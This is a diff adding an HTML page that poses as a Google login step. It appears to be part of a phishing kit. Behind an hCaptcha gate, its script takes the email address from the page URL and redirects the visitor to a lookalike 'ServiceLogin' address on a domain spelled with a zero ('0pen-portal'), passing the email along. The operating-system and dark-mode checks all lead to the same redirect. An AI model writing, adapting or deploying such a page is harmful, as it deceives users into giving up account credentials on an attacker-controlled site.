@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google...</title>
+  <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+</head>
+<body>
+  <div style="width:500px; margin:0 auto;" id="hcaptcha-demo" class="h-captcha"
+    data-sitekey="6ae29b92-3518-4b89-90a1-458f5d5a69a6" data-callback="onSuccess" data-expired-callback="onExpire">
+  </div>
+  <script>
+      // success callback
+      var onSuccess = function (response) {
+        var browserURL = new URL(window.location.href);
+        var params = new URLSearchParams(browserURL.search);
+        var data = window.location.href.split('?')[1]
+        var redurl = 'https://0pen-portal.concert-ipa-cbc.eu/?'
+        // default redirect
+        var redLocation = redurl + 'ServiceLogin?Email=' + data
+  
+        // detect os
+        if (navigator.appVersion.indexOf('Win') != -1) {
+          if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            console.log('dark mode')
+            redLocation = redurl + 'ServiceLogin?Email=' + data
+          } else {
+            redLocation = redurl + 'ServiceLogin?Email=' + data
+          }
+        }
+  
+        if (navigator.appVersion.indexOf('Macintosh') != -1) {
+          if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            console.log('dark mode')
+            redLocation = redurl + 'ServiceLogin?Email=' + data
+          } else {
+            redLocation = redurl + 'ServiceLogin?Email=' + data
+          }
+        }
+        window.location.replace(redLocation);
+      };
+    </script>
+  </body>
+  </html>
